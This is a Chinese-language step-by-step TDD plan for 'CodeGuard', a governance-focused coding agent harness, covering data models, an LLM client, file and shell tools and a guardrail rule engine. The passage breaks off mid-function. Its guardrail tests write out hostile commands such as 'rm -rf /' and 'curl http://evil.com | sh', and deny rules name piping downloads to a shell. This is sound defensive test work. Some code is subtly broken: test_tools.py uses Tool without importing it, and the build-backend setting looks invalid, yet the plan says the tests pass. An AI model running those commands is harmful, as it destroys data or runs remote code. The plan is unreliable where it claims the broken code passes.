# CodeGuard 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**目标：** 从零构建一个以治理为核心的 Coding Agent Harness，使用 Python 实现，包含 mock-LLM 单元测试、React 前端和 Docker 分发。

**架构：** 单体 Python 后端（FastAPI + WebSocket）+ React 前端，单 Docker 容器。Agent 主循环集成 LLM 客户端、工具分发器、护栏引擎、HITL 管理器、反馈验证器、记忆存储和技能加载器。深入聚焦治理维度（护栏、HITL 状态机、范围围栏、审计日志）。

**技术栈：** Python 3.12, FastAPI, pytest, React + Vite, Docker, cryptography (Fernet), OpenAI 兼容 LLM API。

## 全局约束

- Python 3.12+，pytest 作为测试框架
- TDD 强制要求：红 → 绿 → 重构，禁止先写实现再补测试
- 禁止使用 agent 框架（LangChain/AutoGen/CrewAI）— harness 内核必须自主实现
- 机制必须是代码，不能是提示词 — 所有核心机制可用 mock LLM 测试
- 凭据绝不硬编码、绝不进 Git、绝不进日志
- 所有文件操作限制在 workspace 沙箱目录内
- LLM API 为 OpenAI 兼容格式（课程提供 URL）

---

## 文件结构

```
src/codeguard/
├── __init__.py
├── cli.py                      # CLI entry point (init/serve/credentials)
├── server.py                   # FastAPI server (REST + WebSocket)
├── agent/
│   ├── __init__.py
│   ├── loop.py                 # AgentLoop — main agent loop
│   ├── llm_client.py           # LLMClient ABC + RealLLMClient + MockLLMClient
│   └── action.py               # Action parsing from LLM response
├── tools/
│   ├── __init__.py
│   ├── base.py                 # Tool ABC, ToolResult, Action
│   ├── dispatcher.py           # ToolDispatcher
│   ├── file_tools.py           # ReadFile, WriteFile, EditFile, ListFiles, SearchContent
│   ├── shell_tools.py          # RunShell
│   └── test_tools.py           # RunTests, RunLint
├── governance/
│   ├── __init__.py
│   ├── guardrail.py            # GuardrailEngine
│   ├── rules.py                # Rule definitions (R001-R012)
│   ├── hitl.py                 # HITLManager state machine
│   ├── scope_fence.py          # ScopeFence
│   └── audit_log.py           # AuditLog
├── feedback/
│   ├── __init__.py
│   ├── result.py               # FeedbackResult
│   └── validators.py          # TestValidator, LintValidator
├── memory/
│   ├── __init__.py
│   └── store.py               # MemoryStore
├── skills/
│   ├── __init__.py
│   └── loader.py              # SkillLoader
├── mcp/
│   ├── __init__.py
│   └── adapter.py             # MCPToolAdapter
├── credentials/
│   ├── __init__.py
│   └── manager.py             # CredentialManager
└── models/
    ├── __init__.py
    └── entities.py            # All data model dataclasses
```

---

## Phase 1：基础设施

### Task 1：项目脚手架

**文件：**
- 创建：`pyproject.toml`
- 创建：`Makefile`
- 创建：`src/codeguard/__init__.py`
- 创建：`tests/__init__.py`
- 创建：`tests/conftest.py`

**接口：**
- 产出：项目结构、`make test` 命令

- [ ] **步骤 1：创建 pyproject.toml**

```toml
[build-system]
requires = ["setuptools>=68.0", "wheel"]
build-backend = "setuptools.backends._legacy:_Backend"

[project]
name = "codeguard"
version = "0.1.0"
description = "A governance-focused Coding Agent Harness"
requires-python = ">=3.12"
dependencies = [
    "fastapi>=0.110",
    "uvicorn[standard]>=0.27",
    "httpx>=0.27",
    "cryptography>=42.0",
    "pydantic>=2.6",
    "PyYAML>=6.0",
    "python-dotenv>=1.0",
]

[project.optional-dependencies]
dev = [
    "pytest>=8.0",
    "pytest-asyncio>=0.23",
    "pytest-cov>=4.1",
    "httpx>=0.27",
]

[project.scripts]
codeguard = "codeguard.cli:main"

[tool.setuptools.packages.find]
where = ["src"]

[tool.pytest.ini_options]
testpaths = ["tests"]
asyncio_mode = "auto"
```

- [ ] **步骤 2：创建 Makefile**

```makefile
.PHONY: test install dev lint

install:
	pip install -e .

dev:
	pip install -e ".[dev]"

test:
	pytest tests/ -v --tb=short

lint:
	ruff check src/ tests/
```

- [ ] **步骤 3：创建包初始化文件**

创建 `src/codeguard/__init__.py`:
```python
"""CodeGuard: A governance-focused Coding Agent Harness."""
__version__ = "0.1.0"
```

创建 `tests/__init__.py` （空文件）。

创建 `tests/conftest.py`:
```python
import pytest
from pathlib import Path


@pytest.fixture
def tmp_workspace(tmp_path: Path) -> Path:
    """Provide a temporary workspace directory."""
    (tmp_path / ".codeguard").mkdir()
    return tmp_path
```

- [ ] **步骤 4：验证脚手架可用**

运行：`pip install -e ".[dev]" && pytest tests/ -v`
预期：PASS (0 tests collected, no errors)

- [ ] **步骤 5：提交**

```bash
git add pyproject.toml Makefile src/ tests/
git commit -m "chore: project scaffolding with pyproject.toml, Makefile, test setup"
```

---

### Task 2：数据模型

**文件：**
- 创建：`src/codeguard/models/__init__.py`
- 创建：`src/codeguard/models/entities.py`
- 测试：`tests/test_models.py`

**接口：**
- 产出：`Action`, `ToolResult`, `GuardrailDecision`, `HITLRequest`, `FeedbackResult`, `MemoryEntry`, `Skill`, `AuditEntry`, `Message`, `LLMResponse`, `StepEvent`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_models.py
from codeguard.models.entities import (
    Action, ToolResult, GuardrailDecision, GuardrailLevel,
    HITLRequest, HITLState, FeedbackResult, MemoryEntry, Skill, AuditEntry,
    Message, MessageRole, LLMResponse, StepEvent, StepType,
)
from datetime import datetime


def test_action_creation():
    action = Action(name="read_file", params={"path": "test.py"})
    assert action.name == "read_file"
    assert action.params["path"] == "test.py"


def test_tool_result_success():
    result = ToolResult(success=True, output="file contents")
    assert result.success is True
    assert result.output == "file contents"
    assert result.error is None


def test_tool_result_failure():
    result = ToolResult(success=False, output="", error="File not found")
    assert result.success is False
    assert result.error == "File not found"


def test_guardrail_decision_deny():
    decision = GuardrailDecision(level=GuardrailLevel.DENY, reason="Dangerous", rule_id="R001")
    assert decision.level == GuardrailLevel.DENY
    assert decision.rule_id == "R001"


def test_hitl_request_pending():
    req = HITLRequest(
        id="abc-123",
        action=Action(name="run_shell", params={"command": "rm -rf /"}),
        state=HITLState.PENDING,
        created_at=datetime.now(),
    )
    assert req.state == HITLState.PENDING
    assert req.action.name == "run_shell"


def test_feedback_result():
    feedback = FeedbackResult(
        validator="test", success=False, details="1 failed",
        failures=["test_foo"], suggestions=["Check import"]
    )
    assert feedback.success is False
    assert len(feedback.failures) == 1


def test_memory_entry():
    entry = MemoryEntry(key="test_framework", category="convention", value="pytest")
    assert entry.key == "test_framework"
    assert entry.category == "convention"


def test_skill():
    skill = Skill(name="tdd", trigger="test,tdd", instructions="Write test first")
    assert skill.name == "tdd"
    assert "test" in skill.trigger


def test_audit_entry():
    entry = AuditEntry(
        timestamp=datetime.now(),
        action_name="run_shell",
        params={"command": "***"},
        decision="deny",
    )
    assert entry.params["command"] == "***"


def test_message():
    msg = Message(role=MessageRole.USER, content="Implement sort")
    assert msg.role == MessageRole.USER


def test_llm_response():
    resp = LLMResponse(content="I will read the file", tool_calls=[{"name": "read_file"}])
    assert resp.content == "I will read the file"
    assert len(resp.tool_calls) == 1


def test_step_event():
    event = StepEvent(step_index=0, step_type=StepType.THINK, content="Analyzing task")
    assert event.step_index == 0
    assert event.step_type == StepType.THINK
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_models.py -v`
预期：FAIL with `ModuleNotFoundError: No module named 'codeguard.models'`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/models/__init__.py
from codeguard.models.entities import *
```

```python
# src/codeguard/models/entities.py
from __future__ import annotations
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any
from uuid import uuid4


class GuardrailLevel(Enum):
    ALLOW = "allow"
    ASK = "ask"
    DENY = "deny"


class HITLState(Enum):
    PENDING = "pending"
    APPROVED = "approved"
    DENIED = "denied"
    TIMEOUT = "timeout"
    EXECUTING = "executing"
    COMPLETED = "completed"
    SKIPPED = "skipped"
    FAILED = "failed"


class MessageRole(Enum):
    USER = "user"
    ASSISTANT = "assistant"
    SYSTEM = "system"


class StepType(Enum):
    THINK = "think"
    ACTION = "action"
    TOOL_CALL = "tool_call"
    GUARDRAIL = "guardrail"
    FEEDBACK = "feedback"
    HITL = "hitl"
    RESULT = "result"


@dataclass
class Action:
    name: str
    params: dict[str, Any]
    raw_llm_output: str = ""


@dataclass
class ToolResult:
    success: bool
    output: str = ""
    error: str | None = None
    exit_code: int | None = None


@dataclass
class GuardrailDecision:
    level: GuardrailLevel
    reason: str
    rule_id: str


@dataclass
class HITLRequest:
    id: str
    action: Action
    state: HITLState
    created_at: datetime
    resolved_at: datetime | None = None
    resolved_by: str | None = None


@dataclass
class FeedbackResult:
    validator: str
    success: bool
    details: str
    failures: list[str] = field(default_factory=list)
    suggestions: list[str] = field(default_factory=list)

    def to_message(self) -> str:
        status = "PASSED" if self.success else "FAILED"
        msg = f"Feedback ({self.validator}): {status}\n{self.details}"
        if self.failures:
            msg += f"\nFailures: {', '.join(self.failures)}"
        return msg


@dataclass
class MemoryEntry:
    key: str
    category: str
    value: str
    updated_at: datetime = field(default_factory=datetime.now)


@dataclass
class Skill:
    name: str
    trigger: str
    instructions: str
    file_path: str = ""


@dataclass
class AuditEntry:
    timestamp: datetime
    action_name: str
    params: dict[str, Any]
    decision: str
    result: str | None = None


@dataclass
class Message:
    role: MessageRole
    content: str
    created_at: datetime = field(default_factory=datetime.now)


@dataclass
class LLMResponse:
    content: str
    tool_calls: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class StepEvent:
    step_index: int
    step_type: StepType
    content: Any
    created_at: datetime = field(default_factory=datetime.now)
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_models.py -v`
预期：PASS (all 12 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/models/ tests/test_models.py
git commit -m "feat: add data model entities (Action, ToolResult, GuardrailDecision, etc.)"
```

---

### Task 3：LLM 抽象层

**文件：**
- 创建：`src/codeguard/agent/__init__.py`
- 创建：`src/codeguard/agent/llm_client.py`
- 测试：`tests/test_llm_client.py`

**接口：**
- 消费：`Message`, `LLMResponse` from Task 2
- 产出：`LLMClient` (ABC), `MockLLMClient`, `RealLLMClient`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_llm_client.py
import pytest
from codeguard.agent.llm_client import LLMClient, MockLLMClient
from codeguard.models.entities import Message, MessageRole, LLMResponse


@pytest.mark.asyncio
async def test_mock_llm_returns_preset_response():
    responses = [
        LLMResponse(content="Reading file", tool_calls=[{"name": "read_file", "params": {"path": "test.py"}}]),
        LLMResponse(content="Done", tool_calls=[]),
    ]
    client = MockLLMClient(responses)
    messages = [Message(role=MessageRole.USER, content="Read test.py")]

    resp1 = await client.call(messages)
    assert resp1.content == "Reading file"
    assert resp1.tool_calls[0]["name"] == "read_file"

    resp2 = await client.call(messages)
    assert resp2.content == "Done"
    assert len(resp2.tool_calls) == 0


@pytest.mark.asyncio
async def test_mock_llm_raises_on_overflow():
    responses = [LLMResponse(content="Only one", tool_calls=[])]
    client = MockLLMClient(responses)
    messages = [Message(role=MessageRole.USER, content="Hi")]

    await client.call(messages)
    with pytest.raises(IndexError):
        await client.call(messages)


def test_llm_client_is_abstract():
    with pytest.raises(TypeError):
        LLMClient()
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_llm_client.py -v`
预期：FAIL with `ModuleNotFoundError: No module named 'codeguard.agent'`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/agent/__init__.py
```

```python
# src/codeguard/agent/llm_client.py
from __future__ import annotations
from abc import ABC, abstractmethod
from codeguard.models.entities import Message, LLMResponse


class LLMClient(ABC):
    """Abstract LLM client — replaceable with mock for unit tests."""

    @abstractmethod
    async def call(self, messages: list[Message]) -> LLMResponse:
        """Send messages to LLM and return response."""
        ...


class MockLLMClient(LLMClient):
    """Returns preset responses for deterministic unit testing."""

    def __init__(self, responses: list[LLMResponse]):
        self._responses = responses
        self._index = 0

    async def call(self, messages: list[Message]) -> LLMResponse:
        response = self._responses[self._index]
        self._index += 1
        return response


class RealLLMClient(LLMClient):
    """OpenAI-compatible API client."""

    def __init__(self, base_url: str, api_key: str, model: str = "gpt-4"):
        self._base_url = base_url
        self._api_key = api_key
        self._model = model

    async def call(self, messages: list[Message]) -> LLMResponse:
        import httpx

        headers = {"Authorization": f"Bearer {self._api_key}"}
        payload = {
            "model": self._model,
            "messages": [{"role": m.role.value, "content": m.content} for m in messages],
        }
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{self._base_url}/v1/chat/completions",
                headers=headers,
                json=payload,
                timeout=60.0,
            )
            resp.raise_for_status()
            data = resp.json()
            return LLMResponse(
                content=data["choices"][0]["message"]["content"],
                tool_calls=[],
            )
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_llm_client.py -v`
预期：PASS (3 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/agent/ tests/test_llm_client.py
git commit -m "feat: add LLM abstraction layer with MockLLMClient for deterministic tests"
```

---

## Phase 2：工具

### Task 4：工具基类与分发器

**文件：**
- 创建：`src/codeguard/tools/__init__.py`
- 创建：`src/codeguard/tools/base.py`
- 创建：`src/codeguard/tools/dispatcher.py`
- 测试：`tests/test_tool_dispatcher.py`

**接口：**
- 消费：`Action`, `ToolResult` from Task 2
- 产出：`Tool` (ABC), `ToolDispatcher`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_tool_dispatcher.py
import pytest
from codeguard.tools.base import Tool
from codeguard.tools.dispatcher import ToolDispatcher
from codeguard.models.entities import Action, ToolResult


class FakeEchoTool(Tool):
    name = "echo"

    def execute(self, params: dict) -> ToolResult:
        return ToolResult(success=True, output=params.get("text", ""))


class FakeFailTool(Tool):
    name = "fail"

    def execute(self, params: dict) -> ToolResult:
        return ToolResult(success=False, output="", error="Always fails")


def test_dispatch_known_tool():
    dispatcher = ToolDispatcher()
    dispatcher.register(FakeEchoTool())
    result = dispatcher.dispatch(Action(name="echo", params={"text": "hello"}))
    assert result.success is True
    assert result.output == "hello"


def test_dispatch_unknown_tool():
    dispatcher = ToolDispatcher()
    result = dispatcher.dispatch(Action(name="nonexistent", params={}))
    assert result.success is False
    assert "Unknown tool" in result.error


def test_dispatch_fail_tool():
    dispatcher = ToolDispatcher()
    dispatcher.register(FakeFailTool())
    result = dispatcher.dispatch(Action(name="fail", params={}))
    assert result.success is False
    assert result.error == "Always fails"


def test_register_multiple_tools():
    dispatcher = ToolDispatcher()
    dispatcher.register(FakeEchoTool())
    dispatcher.register(FakeFailTool())
    assert "echo" in dispatcher.list_tools()
    assert "fail" in dispatcher.list_tools()
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_tool_dispatcher.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/tools/__init__.py
```

```python
# src/codeguard/tools/base.py
from __future__ import annotations
from abc import ABC, abstractmethod
from codeguard.models.entities import ToolResult


class Tool(ABC):
    """Abstract base class for all agent tools."""
    name: str

    @abstractmethod
    def execute(self, params: dict) -> ToolResult:
        """Execute the tool with given parameters."""
        ...
```

```python
# src/codeguard/tools/dispatcher.py
from __future__ import annotations
from codeguard.models.entities import Action, ToolResult
from codeguard.tools.base import Tool


class ToolDispatcher:
    """Routes actions to registered tools."""

    def __init__(self):
        self._tools: dict[str, Tool] = {}

    def register(self, tool: Tool) -> None:
        self._tools[tool.name] = tool

    def dispatch(self, action: Action) -> ToolResult:
        tool = self._tools.get(action.name)
        if tool is None:
            return ToolResult(
                success=False,
                error=f"Unknown tool: {action.name}",
            )
        return tool.execute(action.params)

    def list_tools(self) -> list[str]:
        return list(self._tools.keys())
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_tool_dispatcher.py -v`
预期：PASS (4 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/tools/ tests/test_tool_dispatcher.py
git commit -m "feat: add Tool ABC and ToolDispatcher for action routing"
```

---

### Task 5：文件工具

**文件：**
- 创建：`src/codeguard/tools/file_tools.py`
- 测试：`tests/test_file_tools.py`

**接口：**
- 消费：`Tool`, `ToolResult` from Task 4
- 产出：`ReadFile`, `WriteFile`, `EditFile`, `ListFiles`, `SearchContent`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_file_tools.py
import pytest
from pathlib import Path
from codeguard.tools.file_tools import ReadFile, WriteFile, EditFile, ListFiles, SearchContent


def test_read_file(tmp_workspace: Path):
    (tmp_workspace / "test.py").write_text("print('hello')")
    tool = ReadFile(workspace_root=tmp_workspace)
    result = tool.execute({"path": "test.py"})
    assert result.success is True
    assert "hello" in result.output


def test_read_file_not_found(tmp_workspace: Path):
    tool = ReadFile(workspace_root=tmp_workspace)
    result = tool.execute({"path": "nonexistent.py"})
    assert result.success is False
    assert "not found" in result.error.lower()


def test_write_file(tmp_workspace: Path):
    tool = WriteFile(workspace_root=tmp_workspace)
    result = tool.execute({"path": "output.py", "content": "x = 1"})
    assert result.success is True
    assert (tmp_workspace / "output.py").read_text() == "x = 1"


def test_edit_file(tmp_workspace: Path):
    (tmp_workspace / "test.py").write_text("old code\n")
    tool = EditFile(workspace_root=tmp_workspace)
    result = tool.execute({"path": "test.py", "old": "old", "new": "new"})
    assert result.success is True
    assert "new code" in (tmp_workspace / "test.py").read_text()


def test_edit_file_no_match(tmp_workspace: Path):
    (tmp_workspace / "test.py").write_text("hello\n")
    tool = EditFile(workspace_root=tmp_workspace)
    result = tool.execute({"path": "test.py", "old": "nonexistent", "new": "x"})
    assert result.success is False


def test_list_files(tmp_workspace: Path):
    (tmp_workspace / "a.py").write_text("")
    (tmp_workspace / "b.py").write_text("")
    (tmp_workspace / "c.txt").write_text("")
    tool = ListFiles(workspace_root=tmp_workspace)
    result = tool.execute({"pattern": "*.py"})
    assert result.success is True
    assert "a.py" in result.output
    assert "b.py" in result.output
    assert "c.txt" not in result.output


def test_search_content(tmp_workspace: Path):
    (tmp_workspace / "test.py").write_text("def foo():\n    return 42\n")
    tool = SearchContent(workspace_root=tmp_workspace)
    result = tool.execute({"pattern": "foo"})
    assert result.success is True
    assert "foo" in result.output
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_file_tools.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/tools/file_tools.py
from __future__ import annotations
import fnmatch
import re
from pathlib import Path
from codeguard.models.entities import ToolResult
from codeguard.tools.base import Tool


class ReadFile(Tool):
    name = "read_file"

    def __init__(self, workspace_root: Path):
        self._root = workspace_root

    def execute(self, params: dict) -> ToolResult:
        path = self._root / params["path"]
        if not path.exists():
            return ToolResult(success=False, error=f"File not found: {params['path']}")
        return ToolResult(success=True, output=path.read_text())


class WriteFile(Tool):
    name = "write_file"

    def __init__(self, workspace_root: Path):
        self._root = workspace_root

    def execute(self, params: dict) -> ToolResult:
        path = self._root / params["path"]
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(params["content"])
        return ToolResult(success=True, output=f"Wrote {params['path']}")


class EditFile(Tool):
    name = "edit_file"

    def __init__(self, workspace_root: Path):
        self._root = workspace_root

    def execute(self, params: dict) -> ToolResult:
        path = self._root / params["path"]
        if not path.exists():
            return ToolResult(success=False, error=f"File not found: {params['path']}")
        content = path.read_text()
        old = params["old"]
        new = params["new"]
        if old not in content:
            return ToolResult(success=False, error=f"Pattern not found: {old}")
        count = content.count(old)
        if count > 1:
            return ToolResult(success=False, error=f"Pattern matches {count} times, must be unique")
        new_content = content.replace(old, new)
        path.write_text(new_content)
        return ToolResult(success=True, output=f"Edited {params['path']}")


class ListFiles(Tool):
    name = "list_files"

    def __init__(self, workspace_root: Path):
        self._root = workspace_root

    def execute(self, params: dict) -> ToolResult:
        pattern = params.get("pattern", "*")
        matches = [str(p.relative_to(self._root)) for p in self._root.rglob(pattern) if p.is_file()]
        return ToolResult(success=True, output="\n".join(matches))


class SearchContent(Tool):
    name = "search_content"

    def __init__(self, workspace_root: Path):
        self._root = workspace_root

    def execute(self, params: dict) -> ToolResult:
        pattern = params["pattern"]
        results = []
        for p in self._root.rglob("*"):
            if not p.is_file():
                continue
            for i, line in enumerate(p.read_text(errors="ignore").splitlines(), 1):
                if re.search(pattern, line):
                    results.append(f"{p.relative_to(self._root)}:{i}: {line}")
        return ToolResult(success=True, output="\n".join(results))
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_file_tools.py -v`
预期：PASS (7 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/tools/file_tools.py tests/test_file_tools.py
git commit -m "feat: add file tools (ReadFile, WriteFile, EditFile, ListFiles, SearchContent)"
```

---

### Task 6：Shell 与测试/Lint 工具

**文件：**
- 创建：`src/codeguard/tools/shell_tools.py`
- 创建：`src/codeguard/tools/test_tools.py`
- 测试：`tests/test_shell_tools.py`
- 测试：`tests/test_test_tools.py`

**接口：**
- 消费：`Tool`, `ToolResult` from Task 4
- 产出：`RunShell`, `RunTests`, `RunLint`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_shell_tools.py
from codeguard.tools.shell_tools import RunShell


def test_run_shell_echo():
    tool = RunShell()
    result = tool.execute({"command": "echo hello"})
    assert result.success is True
    assert "hello" in result.output
    assert result.exit_code == 0


def test_run_shell_failure():
    tool = RunShell()
    result = tool.execute({"command": "exit 1"})
    assert result.success is False
    assert result.exit_code == 1
```

```python
# tests/test_test_tools.py
from codeguard.tools.test_tools import RunTests, RunLint


def test_run_tests_pass(tmp_path):
    (tmp_path / "test_pass.py").write_text("def test_ok():\n    assert True\n")
    tool = RunTests()
    result = tool.execute({"command": f"pytest {tmp_path}/test_pass.py"})
    assert result.success is True


def test_run_tests_fail(tmp_path):
    (tmp_path / "test_fail.py").write_text("def test_bad():\n    assert False\n")
    tool = RunTests()
    result = tool.execute({"command": f"pytest {tmp_path}/test_fail.py"})
    assert result.success is False
    assert "assert False" in result.output or "failed" in result.output.lower()


def test_run_lint():
    tool = RunLint()
    result = tool.execute({"command": "echo 'lint output'"})
    assert result.success is True
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_shell_tools.py tests/test_test_tools.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/tools/shell_tools.py
from __future__ import annotations
import subprocess
from codeguard.models.entities import ToolResult
from codeguard.tools.base import Tool


class RunShell(Tool):
    name = "run_shell"

    def execute(self, params: dict) -> ToolResult:
        command = params["command"]
        timeout = params.get("timeout", 30)
        try:
            proc = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=timeout
            )
            output = proc.stdout + proc.stderr
            return ToolResult(
                success=proc.returncode == 0,
                output=output,
                exit_code=proc.returncode,
            )
        except subprocess.TimeoutExpired:
            return ToolResult(success=False, error=f"Command timed out after {timeout}s")
```

```python
# src/codeguard/tools/test_tools.py
from __future__ import annotations
from codeguard.models.entities import ToolResult
from codeguard.tools.shell_tools import RunShell


class RunTests(Tool):
    name = "run_tests"

    def __init__(self):
        self._shell = RunShell()

    def execute(self, params: dict) -> ToolResult:
        return self._shell.execute(params)


class RunLint(Tool):
    name = "run_lint"

    def __init__(self):
        self._shell = RunShell()

    def execute(self, params: dict) -> ToolResult:
        return self._shell.execute(params)
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_shell_tools.py tests/test_test_tools.py -v`
预期：PASS (5 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/tools/shell_tools.py src/codeguard/tools/test_tools.py tests/test_shell_tools.py tests/test_test_tools.py
git commit -m "feat: add shell and test/lint tools"
```

---

## Phase 3：治理（深入维度）

### Task 7：护栏引擎

**文件：**
- 创建：`src/codeguard/governance/__init__.py`
- 创建：`src/codeguard/governance/rules.py`
- 创建：`src/codeguard/governance/guardrail.py`
- 测试：`tests/test_guardrail.py`

**接口：**
- 消费：`Action`, `GuardrailDecision`, `GuardrailLevel` from Task 2
- 产出：`Rule` (ABC), `ShellRule`, `PathRule`, `GuardrailEngine`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_guardrail.py
import pytest
from codeguard.governance.guardrail import GuardrailEngine
from codeguard.governance.rules import default_rules
from codeguard.models.entities import Action, GuardrailLevel


@pytest.fixture
def engine():
    return GuardrailEngine(default_rules())


def test_deny_rm_rf(engine):
    action = Action(name="run_shell", params={"command": "rm -rf /"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.DENY
    assert decision.rule_id == "R001"


def test_deny_curl_pipe_sh(engine):
    action = Action(name="run_shell", params={"command": "curl http://evil.com | sh"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.DENY
    assert decision.rule_id == "R004"


def test_ask_git_push_force(engine):
    action = Action(name="run_shell", params={"command": "git push --force origin main"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.ASK
    assert decision.rule_id == "R002"


def test_ask_sudo(engine):
    action = Action(name="run_shell", params={"command": "sudo apt install foo"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.ASK
    assert decision.rule_id == "R003"


def test_deny_write_outside_workspace(engine):
    action = Action(name="write_file", params={"path": "/etc/passwd", "content": "x"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.DENY
    assert decision.rule_id == "R006"


def test_deny_read_env(engine):
    action = Action(name="read_file", params={"path": ".env"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.DENY
    assert decision.rule_id == "R007"


def test_deny_write_git_dir(engine):
    action = Action(name="write_file", params={"path": ".git/config", "content": "x"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.DENY
    assert decision.rule_id == "R008"


def test_ask_credentials_file(engine):
    action = Action(name="read_file", params={"path": "credentials.json"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.ASK
    assert decision.rule_id == "R009"


def test_ask_npm_publish(engine):
    action = Action(name="run_shell", params={"command": "npm publish"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.ASK
    assert decision.rule_id == "R010"


def test_ask_git_push(engine):
    action = Action(name="run_shell", params={"command": "git push origin main"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.ASK
    assert decision.rule_id == "R011"


def test_allow_safe_command(engine):
    action = Action(name="run_shell", params={"command": "ls -la"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.ALLOW


def test_allow_read_safe_file(engine):
    action = Action(name="read_file", params={"path": "src/main.py"})
    decision = engine.check(action)
    assert decision.level == GuardrailLevel.ALLOW
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_guardrail.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/governance/__init__.py
```

```python
# src/codeguard/governance/rules.py
from __future__ import annotations
import re
from abc import ABC, abstractmethod
from codeguard.models.entities import Action, GuardrailDecision, GuardrailLevel


class Rule(ABC):
    """Abstract guardrail rule — deterministic code, not a prompt."""
    rule_id: str

    @abstractmethod
    def evaluate(self, action: Action) -> GuardrailDecision | None:
        """Return a decision if this rule matches, None otherwise."""
        ...


class ShellRule(Rule):
    def __init__(self, rule_id: str, pattern: str, level: GuardrailLevel, reason: str):
        self.rule_id = rule_id
        self._pattern = re.compile(pattern)
        self._level = level
        self._reason = reason

    def evaluate(self, action: Action) -> GuardrailDecision | None:
        if action.name not in ("run_shell", "run_tests", "run_lint"):
            return None
        command = action.params.get("command", "")
        if self._pattern.search(command):
            return GuardrailDecision(level=self._level, reason=self._reason, rule_id=self.rule_id)
        return None


class PathRule(Rule):
    def __init__(self, rule_id: str, level: GuardrailLevel, reason: str, check_fn):
        self.rule_id = rule_id
        self._level = level
        self._reason = reason
        self._check_fn = check_fn

    def evaluate(self, action: Action) -> GuardrailDecision | None:
        if action.name not in ("read_file", "write_file", "edit_file"):
            return None
        path = action.params.get("path", "")
        if self._check_fn(path):
            return GuardrailDecision(level=self._level, reason=self._reason, rule_id=self.rule_id)
        return None


def _is_absolute_or_parent(path: str) -> bool:
    return path.startswith("/") or ".." in path


def _is_env_file(path: str) -> bool:
    return path == ".env" or path.startswith(".env.")


def _is_git_dir(path: str) -> bool:
    return path.startswith(".git/") or path == ".git"


def _is_credential_file(path: str) -> bool:
    keywords = ("credential", "secret", "key", "token")
    return any(kw in path.lower() for kw in keywords)


def default_rules() -> list[Rule]:
    return [
        ShellRule("R001", r"rm\s+-rf", GuardrailLevel.DENY, "rm -rf is destructive"),
        ShellRule("R002", r"git\s+push\s+(-(-?force|f)\b|--force)", GuardrailLevel.ASK, "Force push is dangerous"),
        ShellRule("R003", r"\bsudo\b", GuardrailLevel.ASK, "sudo requires confirmation"),
        ShellRule("R004", r"(curl|wget).*\|\s*(sh|bash)", GuardrailLevel.DENY, "Piping to shell is dangerous"),
        ShellRule("R005", r"docker\s+(rm|rmi|system\s+prune)", GuardrailLevel.ASK, "Docker cleanup requires confirmation"),
        PathRule("R006", GuardrailLevel.DENY, "Path outside workspace", _is_absolute_or_parent),
        PathRule("R007", GuardrailLevel.DENY, "Accessing .env file", _is_env_file),
        PathRule("R008", GuardrailLevel.DENY, "Accessing .git directory", _is_git_dir),
        PathRule("R009", GuardrailLevel.ASK, "Accessing credential file", _is_credential_file),
        ShellRule("R010", r"(npm\s+publish|pip\s+upload|twine\s+upload)", GuardrailLevel.ASK, "Publishing requires confirmation"),
        ShellRule("R011", r"git\s+push(?!\s+(-(-?force|f)\b|--force))", GuardrailLevel.ASK, "Git push requires confirmation"),
    ]
```

```python
# src/codeguard/governance/guardrail.py
from __future__ import annotations
from codeguard.models.entities import Action, GuardrailDecision, GuardrailLevel
from codeguard.governance.rules import Rule


class GuardrailEngine:
    """Deterministic guardrail engine — pure function, no LLM needed."""

    def __init__(self, rules: list[Rule]):
        self._rules = rules

    def check(self, action: Action) -> GuardrailDecision:
        for rule in self._rules:
            decision = rule.evaluate(action)
